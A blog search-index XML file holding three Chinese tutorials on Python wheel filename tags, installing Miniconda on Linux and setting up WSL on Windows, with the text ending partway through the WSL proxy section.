<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>whl文件名后缀</title>
      <link href="/2025/05/02/whl-wen-jian-ming-hou-zhui/"/>
      <url>/2025/05/02/whl-wen-jian-ming-hou-zhui/</url>
      
        <content type="html"><![CDATA[<h1 id="whl文件名后缀"><a href="#whl文件名后缀" class="headerlink" title="whl文件名后缀"></a>whl文件名后缀</h1><h2 id="1-Wheel-文件名的基本格式"><a href="#1-Wheel-文件名的基本格式" class="headerlink" title="1. Wheel 文件名的基本格式"></a>1. Wheel 文件名的基本格式</h2><p>Wheel 名称遵循 PEP 427 规范，通用格式为：</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token punctuation">{</span>distribution<span class="token punctuation">}</span><span class="token operator">-</span><span class="token punctuation">{</span>version<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">{</span>build tag<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token operator">-</span><span class="token punctuation">{</span>python tag<span class="token punctuation">}</span><span class="token operator">-</span><span class="token punctuation">{</span>abi tag<span class="token punctuation">}</span><span class="token operator">-</span><span class="token punctuation">{</span>platform tag<span class="token punctuation">}</span><span class="token punctuation">.</span>whl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>distribution</strong>：包名</li><li><strong>version</strong>：包版本</li><li><strong>build tag</strong>（可选）：构建号</li><li><strong>python tag</strong>：支持的 Python 解释器及版本</li><li><strong>abi tag</strong>：二进制兼容的 ABI（应用二进制接口）</li><li><strong>platform tag</strong>：目标操作系统和硬件平台</li></ul><p>例子：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">mypkg-1.2.3-1-cp39-cp39-manylinux2014_x86_64.whl       │    │   │    │            └──── platform tag       │    │   │    └──────────────── abi tag       │    │   └─────────────────────── python tag       │    └─────────────────────────── build tag       └─────────────────────────────── distribution-version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="2-build-tag"><a href="#2-build-tag" class="headerlink" title="2. build tag"></a>2. build tag</h2><ul><li>格式：一个整数，有时候也会带字母或其他标识</li><li>用途：同一版本的多次编译时区分，比如针对不同源或依赖变动的二进制重构</li><li>示例：<ul><li><code>mypkg-1.0-1-...</code> 与 <code>mypkg-1.0-2-...</code> 表示同一版本的第 1 次和第 2 次构建</li></ul></li></ul><hr><h2 id="3-python-tag"><a href="#3-python-tag" class="headerlink" title="3. python tag"></a>3. python tag</h2><p>指明哪些 Python 解释器及版本可以安装该 Wheel。常见格式及含义：</p><table><thead><tr><th>tag 示例</th><th>含义</th></tr></thead><tbody><tr><td><code>py3</code></td><td>支持所有 Python 3.x</td></tr><tr><td><code>py36</code> 、<code>py37</code>…</td><td>专用于 Python 3.6、3.7 等</td></tr><tr><td><code>py2.py3</code></td><td>同时支持 Python 2.x 和 3.x</td></tr><tr><td><code>cp39</code></td><td>CPython 3.9</td></tr><tr><td><code>cp310</code></td><td>CPython 3.10</td></tr><tr><td><code>pp37</code></td><td>PyPy 3.7</td></tr><tr><td><code>jy37</code></td><td>Jython 2.7（标识为 <code>jy27</code>）等</td></tr></tbody></table><ul><li><strong>前缀</strong><ul><li><code>py</code>：纯 Python 实现</li><li><code>cp</code>：CPython（二进制扩展）</li><li><code>pp</code>：PyPy</li><li><code>jy</code>：Jython</li></ul></li></ul><hr><h2 id="4-abi-tag"><a href="#4-abi-tag" class="headerlink" title="4. abi tag"></a>4. abi tag</h2><p>ABI（Application Binary Interface）决定了编译的 C 扩展与解释器的二进制兼容性。常见 ABI tag：</p><table><thead><tr><th>tag 示例</th><th>含义</th></tr></thead><tbody><tr><td><code>none</code></td><td>纯 Python 包，不含 C 扩展</td></tr><tr><td><code>abi3</code></td><td>使用了稳定的“limited API”（PEP 384），跨多个 CPython 版本兼容</td></tr><tr><td><code>cp39</code></td><td>针对 CPython 3.9 标准 ABI 编译</td></tr><tr><td><code>cp39m</code></td><td>CPython 3.9 + pymalloc enabled（<code>m</code>）</td></tr><tr><td><code>cp310d</code></td><td>CPython 3.10 Debug build（<code>d</code>）</td></tr></tbody></table><ul><li>如果 <code>python tag</code> 与 <code>abi tag</code> 一致（如 <code>cp39-cp39</code>），表示该包针对该版本的标准 ABI 编译</li><li>带后缀的如 <code>m</code>、<code>d</code>、<code>u</code> 等表示特定的编译选项</li></ul><hr><h2 id="5-platform-tag"><a href="#5-platform-tag" class="headerlink" title="5. platform tag"></a>5. platform tag</h2><p>描述该 Wheel 的目标操作系统、系统版本和 CPU 架构。常见平台 tag 及示例：</p><table><thead><tr><th>platform tag 示例</th><th>含义</th></tr></thead><tbody><tr><td><code>manylinux1_x86_64</code></td><td>Linux x86_64，符合 Manylinux1 标准</td></tr><tr><td><code>manylinux2014_aarch64</code></td><td>Linux ARM64，符合 Manylinux2014 标准</td></tr><tr><td><code>win_amd64</code></td><td>Windows 64 位</td></tr><tr><td><code>win32</code></td><td>Windows 32 位</td></tr><tr><td><code>macosx_10_9_x86_64</code></td><td>macOS 10.9+ on x86_64</td></tr><tr><td><code>macosx_11_0_arm64</code></td><td>macOS 11+ on Apple Silicon (ARM64)</td></tr><tr><td><code>any</code></td><td>平台无关（纯 Python 包）</td></tr></tbody></table><ul><li><strong>manylinux</strong> 系列：用于在大多数 Linux 发行版上安装二进制扩展</li><li><strong>macosx</strong>：通常还会带上最低支持的 macOS 版本号</li><li><strong>any</strong>：完全纯 Python，无平台限制</li></ul><hr><h2 id="6-综合示例解析"><a href="#6-综合示例解析" class="headerlink" title="6. 综合示例解析"></a>6. 综合示例解析</h2><table><thead><tr><th>Wheel 名称</th><th>解释</th></tr></thead><tbody><tr><td><code>requests-2.28.1-py3-none-any.whl</code></td><td>纯 Python 包 <code>requests</code> v2.28.1，支持所有 Python 3，平台无关</td></tr><tr><td><code>numpy-1.24.0-cp39-cp39-manylinux2014_x86_64.whl</code></td><td><code>numpy</code> v1.24.0，CPython 3.9 标准 ABI，Linux x86_64 二进制</td></tr><tr><td><code>Pillow-9.3.0-cp310-cp310-win_amd64.whl</code></td><td><code>Pillow</code> v9.3.0，CPython 3.10，Windows 64 位</td></tr><tr><td><code>somepkg-0.1.0-2-cp38-abi3-manylinux1_x86_64.whl</code></td><td><code>somepkg</code> v0.1.0，第 2 次构建，CPython 3.8 编译但使用 abi3，Linux x86_64</td></tr></tbody></table><hr><h2 id="7-为什么要了解这些后缀"><a href="#7-为什么要了解这些后缀" class="headerlink" title="7. 为什么要了解这些后缀"></a>7. 为什么要了解这些后缀</h2><ol><li><strong>避免安装失败</strong><ul><li><code>pip install package.whl</code> 时，若当前环境的 Python 版本、ABI 或平台与 Wheel 不匹配，安装会被跳过或报错。</li></ul></li><li><strong>提高下载速度</strong><ul><li>选择预编译好的 <code>.whl</code>，可免去源码编译时间，尤其是大型 C 扩展库（如 NumPy、SciPy）。</li></ul></li><li><strong>跨平台兼容</strong><ul><li>理解 <code>manylinux</code>、<code>macosx</code>、<code>win</code> 等标签，有助于在不同系统间无痛部署。</li></ul></li></ol><hr><h2 id="8-查找可用的-Wheel"><a href="#8-查找可用的-Wheel" class="headerlink" title="8. 查找可用的 Wheel"></a>8. 查找可用的 Wheel</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip index versions PACKAGE_NAME<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> PACKAGE_NAME --only-binary<span class="token operator">=</span>:all:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>第一个命令列出所有可用版本及对应的 Wheel</li><li>第二个命令强制只使用二进制 Wheel 安装</li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux安装Conda教程</title>
      <link href="/2025/04/10/linux-an-zhuang-conda-jiao-cheng/"/>
      <url>/2025/04/10/linux-an-zhuang-conda-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux安装Conda教程"><a href="#Linux安装Conda教程" class="headerlink" title="Linux安装Conda教程"></a>Linux安装Conda教程</h1><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h2><h3 id="1-1-系统要求"><a href="#1-1-系统要求" class="headerlink" title="1.1 系统要求"></a>1.1 系统要求</h3><ul><li>操作系统：大多数 Linux 发行版（如 Ubuntu、Debian、CentOS、Fedora 等）都可使用。</li><li>权限：建议使用普通用户（避免使用 root 权限直接安装）来安装并管理 conda 环境。</li><li>网络连接：需要下载安装脚本，可以使用 <code>wget</code> 或 <code>curl</code> 工具。</li></ul><h3 id="1-2-安装前依赖（可选）"><a href="#1-2-安装前依赖（可选）" class="headerlink" title="1.2 安装前依赖（可选）"></a>1.2 安装前依赖（可选）</h3><p>大多数 Linux 系统都自带 <code>bash</code> 和基本工具。如果你的系统缺少 wget 或 curl，可以使用包管理器安装，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Ubuntu / Debian 系统</span><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">wget</span> <span class="token function">curl</span><span class="token comment"># CentOS / Fedora 系统</span><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token function">wget</span> <span class="token function">curl</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="2-下载-Miniconda-安装脚本"><a href="#2-下载-Miniconda-安装脚本" class="headerlink" title="2. 下载 Miniconda 安装脚本"></a>2. 下载 Miniconda 安装脚本</h2><p>Miniconda 提供了适用于 Linux 的安装脚本。可以按以下步骤操作：</p><h3 id="2-1-选择合适的安装程序"><a href="#2-1-选择合适的安装程序" class="headerlink" title="2.1 选择合适的安装程序"></a>2.1 选择合适的安装程序</h3><p>对于大多数 64 位系统，下载最新的 Miniconda3 版本。安装脚本文件名为 <code>Miniconda3-latest-Linux-x86_64.sh</code>。</p><h3 id="2-2-使用-wget-或-curl-下载"><a href="#2-2-使用-wget-或-curl-下载" class="headerlink" title="2.2 使用 wget 或 curl 下载"></a>2.2 使用 wget 或 curl 下载</h3><p>使用 <code>wget</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或使用 <code>curl</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-O</span> https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="3-验证安装包完整性（可选）"><a href="#3-验证安装包完整性（可选）" class="headerlink" title="3. 验证安装包完整性（可选）"></a>3. 验证安装包完整性（可选）</h2><p>为确保下载的文件未被破坏或篡改，可以检查 SHA256 校验和。你需要从 Miniconda 官方页面 查看对应版本的正确 SHA256 值，然后执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sha256sum Miniconda3-latest-Linux-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>比较输出结果和官方提供的校验和。如果一致，则可以继续安装。</p><hr><h2 id="4-安装-Miniconda"><a href="#4-安装-Miniconda" class="headerlink" title="4. 安装 Miniconda"></a>4. 安装 Miniconda</h2><h3 id="4-1-赋予执行权限"><a href="#4-1-赋予执行权限" class="headerlink" title="4.1 赋予执行权限"></a>4.1 赋予执行权限</h3><p>首先为下载的脚本添加执行权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x Miniconda3-latest-Linux-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-运行安装脚本"><a href="#4-2-运行安装脚本" class="headerlink" title="4.2 运行安装脚本"></a>4.2 运行安装脚本</h3><p>使用 bash 执行安装脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./Miniconda3-latest-Linux-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-3-安装过程中注意事项"><a href="#4-3-安装过程中注意事项" class="headerlink" title="4.3 安装过程中注意事项"></a>4.3 安装过程中注意事项</h3><ol><li><strong>阅读许可协议</strong>：安装脚本开始时会显示许可协议，需要按下 <code>Enter</code> 浏览内容，然后输入 <code>yes</code> 接受许可协议。</li><li><strong>选择安装路径</strong>：脚本默认建议安装到用户主目录下的 <code>miniconda3</code> 目录。你可以按回车键接受默认设置，也可以输入自定义路径。</li><li><strong>初始化 conda</strong>：安装过程中会询问是否初始化 conda（即修改 shell 启动文件，如 <code>~/.bashrc</code>）。推荐选择 “yes”，这样每次登录时都会自动加载 conda 环境配置。</li></ol><p>安装完成后，安装脚本会显示 “installation finished.” 的提示。</p><hr><h2 id="5-激活-conda-环境"><a href="#5-激活-conda-环境" class="headerlink" title="5. 激活 conda 环境"></a>5. 激活 conda 环境</h2><p>如果安装时选择了初始化，则会自动在 <code>~/.bashrc</code> 中添加必要的配置，通常类似如下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># &gt;&gt;&gt; conda initialize &gt;&gt;&gt;</span><span class="token comment"># !! Contents within this block are managed by 'conda init' !!</span><span class="token assign-left variable">__conda_setup</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>'/home/your_username/miniconda3/bin/conda<span class="token string">' '</span>shell.bash<span class="token string">' '</span>hook' <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> /dev/null<span class="token variable">)</span></span>"</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> <span class="token parameter variable">-eq</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$__conda_setup</span>"</span><span class="token keyword">else</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"/home/your_username/miniconda3/etc/profile.d/conda.sh"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">.</span> <span class="token string">"/home/your_username/miniconda3/etc/profile.d/conda.sh"</span>    <span class="token keyword">else</span>        <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"/home/your_username/miniconda3/bin:<span class="token environment constant">$PATH</span>"</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token builtin class-name">unset</span> __conda_setup<span class="token comment"># &lt;&lt;&lt; conda initialize &lt;&lt;&lt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你没有选择自动初始化，可以手动执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/miniconda3/etc/profile.d/conda.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者直接将 conda 的路径添加到你的 PATH 环境变量中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=~</span>/miniconda3/bin:<span class="token environment constant">$PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>建议将上述命令添加到 <code>~/.bashrc</code> 或其他相应的 shell 配置文件中。</p><hr><h2 id="6-验证安装"><a href="#6-验证安装" class="headerlink" title="6. 验证安装"></a>6. 验证安装</h2><p>打开一个新的终端或在当前终端执行激活命令后，运行以下命令检查 conda 是否安装成功：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>正常情况下，会输出类似 <code>conda 4.x.x</code> 版本信息。</p><hr><h2 id="7-基本使用"><a href="#7-基本使用" class="headerlink" title="7. 基本使用"></a>7. 基本使用</h2><h3 id="7-1-创建虚拟环境"><a href="#7-1-创建虚拟环境" class="headerlink" title="7.1 创建虚拟环境"></a>7.1 创建虚拟环境</h3><p>例如，创建一个名为 <code>myenv</code> 的环境，并安装 Python 3.9：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda create <span class="token parameter variable">-n</span> myenv <span class="token assign-left variable">python</span><span class="token operator">=</span><span class="token number">3.9</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-2-激活虚拟环境"><a href="#7-2-激活虚拟环境" class="headerlink" title="7.2 激活虚拟环境"></a>7.2 激活虚拟环境</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda activate myenv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>激活后，命令提示符中会显示环境名称。</p><h3 id="7-3-安装其他包"><a href="#7-3-安装其他包" class="headerlink" title="7.3 安装其他包"></a>7.3 安装其他包</h3><p>可以直接使用 conda 安装需要的包，例如安装 numpy：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda <span class="token function">install</span> numpy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此外，也可以使用 pip 安装不在 conda 仓库里的包，但推荐先查找 conda 仓库，因为 conda 可能已经进行了优化和依赖管理。</p><h3 id="7-4-更新-conda"><a href="#7-4-更新-conda" class="headerlink" title="7.4 更新 conda"></a>7.4 更新 conda</h3><p>建议定期更新 conda 以确保使用最新的功能和安全补丁：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda update conda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="8-常见问题排查"><a href="#8-常见问题排查" class="headerlink" title="8. 常见问题排查"></a>8. 常见问题排查</h2><h3 id="8-1-conda-命令未找到"><a href="#8-1-conda-命令未找到" class="headerlink" title="8.1 conda 命令未找到"></a>8.1 conda 命令未找到</h3><ul><li><p>请确保你的 <code>~/.bashrc</code> 文件已正确载入，可以执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>检查是否正确添加了 conda 的安装路径至 PATH 环境变量中。</p></li></ul><h3 id="8-2-安装或更新失败"><a href="#8-2-安装或更新失败" class="headerlink" title="8.2 安装或更新失败"></a>8.2 安装或更新失败</h3><ul><li>检查网络连接或国内用户是否需要配置代理或使用镜像源（例如清华、阿里等提供的 conda 镜像）。</li><li>参考官方文档（conda 官方文档）获取更多帮助和说明。</li></ul><hr><h2 id="9-参考资料"><a href="#9-参考资料" class="headerlink" title="9. 参考资料"></a>9. 参考资料</h2><ul><li></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> conda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装WSL子系统教程</title>
      <link href="/2025/04/10/an-zhuang-wsl-zi-xi-tong-jiao-cheng/"/>
      <url>/2025/04/10/an-zhuang-wsl-zi-xi-tong-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="安装WSL子系统教程"><a href="#安装WSL子系统教程" class="headerlink" title="安装WSL子系统教程"></a>安装WSL子系统教程</h1><hr><h2 id="1-前提条件与准备工作"><a href="#1-前提条件与准备工作" class="headerlink" title="1. 前提条件与准备工作"></a>1. 前提条件与准备工作</h2><ul><li><strong>操作系统要求</strong>：<ul><li>Windows 10：要求版本 2004 及 Build 19041 以上，或</li><li>Windows 11</li></ul></li><li><strong>网络环境</strong>：部分地区需要设置代理。</li><li><strong>管理员权限</strong>：安装及部分配置需要以管理员身份运行 PowerShell 或 CMD。</li><li><strong>存储空间及磁盘规划</strong>：WSL 会在系统盘或你指定的目录中保存 Linux 文件系统，提前规划好存储位置与空间。</li></ul><hr><h2 id="2-WSL-安装方法"><a href="#2-WSL-安装方法" class="headerlink" title="2. WSL 安装方法"></a>2. WSL 安装方法</h2><h3 id="2-1-一键安装（推荐）"><a href="#2-1-一键安装（推荐）" class="headerlink" title="2.1 一键安装（推荐）"></a>2.1 一键安装（推荐）</h3><p>适用于 Windows 10 21H2 及之后版本以及 Windows 11。步骤如下：</p><ol><li><p><strong>打开 PowerShell（管理员模式）</strong>：<br> 在开始菜单搜索 “PowerShell”，右键选择“以管理员身份运行”。</p></li><li><p><strong>执行安装命令</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span>install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此命令会自动启用 WSL 相关组件、虚拟机平台，并默认安装最新的 WSL 版本（通常为 WSL2）和默认 Linux 发行版（一般为 Ubuntu）。</p></li><li><p><strong>重启电脑</strong>：安装完成后系统会提示重启以完成配置。</p></li></ol><h3 id="2-2-手动安装"><a href="#2-2-手动安装" class="headerlink" title="2.2 手动安装"></a>2.2 手动安装</h3><p>对于需要更多自定义选项的用户，手动安装步骤如下：</p><h4 id="（1）启用-WSL-和虚拟机平台功能"><a href="#（1）启用-WSL-和虚拟机平台功能" class="headerlink" title="（1）启用 WSL 和虚拟机平台功能"></a>（1）启用 WSL 和虚拟机平台功能</h4><p>在管理员模式下打开 PowerShell，依次执行：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">dism<span class="token punctuation">.</span>exe <span class="token operator">/</span>online <span class="token operator">/</span><span class="token function">enable-feature</span> <span class="token operator">/</span>featurename:Microsoft-Windows-Subsystem-Linux <span class="token operator">/</span>all <span class="token operator">/</span>norestartdism<span class="token punctuation">.</span>exe <span class="token operator">/</span>online <span class="token operator">/</span><span class="token function">enable-feature</span> <span class="token operator">/</span>featurename:VirtualMachinePlatform <span class="token operator">/</span>all <span class="token operator">/</span>norestart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行后重启计算机。</p><h4 id="（2）安装-WSL2-内核更新包"><a href="#（2）安装-WSL2-内核更新包" class="headerlink" title="（2）安装 WSL2 内核更新包"></a>（2）安装 WSL2 内核更新包</h4><p>前往 WSL2 内核更新包下载链接 ，下载并运行安装包，更新 Linux 内核。</p><h4 id="（3）设置默认-WSL-版本为-WSL2"><a href="#（3）设置默认-WSL-版本为-WSL2" class="headerlink" title="（3）设置默认 WSL 版本为 WSL2"></a>（3）设置默认 WSL 版本为 WSL2</h4><p>再次打开 PowerShell（无需管理员模式也可），执行：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span><span class="token function">set-default</span><span class="token operator">-</span>version 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（4）安装-Linux-发行版"><a href="#（4）安装-Linux-发行版" class="headerlink" title="（4）安装 Linux 发行版"></a>（4）安装 Linux 发行版</h4><p>有两种方式：</p><ul><li><p><strong>通过 Microsoft Store</strong>：搜索 <code>Ubuntu</code>、<code>Debian</code> 等，选择版本（如 Ubuntu 22.04 LTS），点击“获取”安装，推荐这个，然后再执行命令行安装。</p></li><li><p><strong>命令行安装</strong>：查看支持的在线发行版列表：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span>list <span class="token operator">--</span>online<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装指定版本（例如 Ubuntu 20.04）：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span>install <span class="token operator">-</span>d Ubuntu-20<span class="token punctuation">.</span>04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="3-Linux-发行版安装及首次使用"><a href="#3-Linux-发行版安装及首次使用" class="headerlink" title="3. Linux 发行版安装及首次使用"></a>3. Linux 发行版安装及首次使用</h2><ol><li><p><strong>首次启动</strong>：安装完成后，从“开始菜单”启动对应 Linux 发行版。</p></li><li><p><strong>创建用户</strong>：系统会提示你为 Linux 系统创建用户名（须为小写）和密码，这样你就可以使用 <code>sudo</code> 提权操作。</p></li><li><p><strong>更新系统</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>安装常用软件</strong>：根据需要安装 <code>git</code>、<code>vim</code>、<code>python3</code> 等：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span> <span class="token function">vim</span> python3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><hr><h2 id="4-WSL-版本切换：WSL1-与-WSL2"><a href="#4-WSL-版本切换：WSL1-与-WSL2" class="headerlink" title="4. WSL 版本切换：WSL1 与 WSL2"></a>4. WSL 版本切换：WSL1 与 WSL2</h2><p>WSL 中各发行版可以独立设置为 WSL1 或 WSL2。查看所有已安装发行版及其版本：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">-</span>l <span class="token operator">-</span>v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出示例：</p><pre class="line-numbers language-pgsql" data-language="pgsql"><code class="language-pgsql"> NAME            STATE           VERSION* Ubuntu-22.04    Running         2  Ubuntu-20.04    Stopped         2  Debian          Stopped         1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="切换版本"><a href="#切换版本" class="headerlink" title="切换版本"></a>切换版本</h3><ul><li><p><strong>将发行版切换为 WSL2</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span><span class="token function">set-version</span> &lt;发行版名称&gt; 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span><span class="token function">set-version</span> Debian 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>将发行版切换为 WSL1</strong>（如有需求）：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span><span class="token function">set-version</span> &lt;发行版名称&gt; 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>设置默认安装版本</strong>：在安装新发行版时，可以用下面命令设置默认版本：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span><span class="token function">set-default</span><span class="token operator">-</span>version 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>切换版本过程中，转换时间与系统数据量有关，部分较大发行版可能需要几分钟。</p><hr><h2 id="5-附加功能与进阶用法"><a href="#5-附加功能与进阶用法" class="headerlink" title="5. 附加功能与进阶用法"></a>5. 附加功能与进阶用法</h2><h3 id="5-1-Windows-与-WSL-文件共享"><a href="#5-1-Windows-与-WSL-文件共享" class="headerlink" title="5.1 Windows 与 WSL 文件共享"></a>5.1 Windows 与 WSL 文件共享</h3><ul><li><p><strong>WSL 文件系统访问</strong>：<br> 在 WSL 中可通过 <code>/mnt/c/</code> 等路径访问 Windows 磁盘。例如访问 <code>C:\Users\YourName</code>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">cd <span class="token operator">/</span>mnt/c/Users/YourName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>在 Windows 中访问 WSL 文件</strong>：<br> 可使用 File Explorer 直接访问：在地址栏输入 <code>\\wsl$</code>，会显示所有已安装的 WSL 发行版及其文件系统。</p></li><li><p><strong>同步代码与项目文件</strong>：<br> 可以将项目文件放在 Windows 共享目录中，再在 WSL 中编辑、执行，这样两个系统间文件同步简单且快速。</p></li></ul><h3 id="5-2-WSL-GUI-应用（WSLg）"><a href="#5-2-WSL-GUI-应用（WSLg）" class="headerlink" title="5.2 WSL GUI 应用（WSLg）"></a>5.2 WSL GUI 应用（WSLg）</h3><p>在最新版本的 Windows 10 和 Windows 11 上，WSL 支持 Linux 图形界面应用（WSLg）。配置方法如下：</p><ol><li><p><strong>确保 WSL 更新至最新版本</strong>：执行</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span>update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>启动 GUI 应用</strong>（如 Firefox）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> firefoxfirefox <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><p>WSLg 会自动启动并显示 Linux GUI 应用，无需额外配置 X 服务器。</p><h3 id="5-3-代理设置"><a href="#5-3-代理设置" class="headerlink" title="5.3 代理设置"></a>5.3 代理设置</h3><p>如果你处于网络环境受限或想加快下载速度，可以设置代理。</p><h4 id="（1）设置-Windows-系统代理"><a href="#（1）设置-Windows-系统代理" class="headerlink" 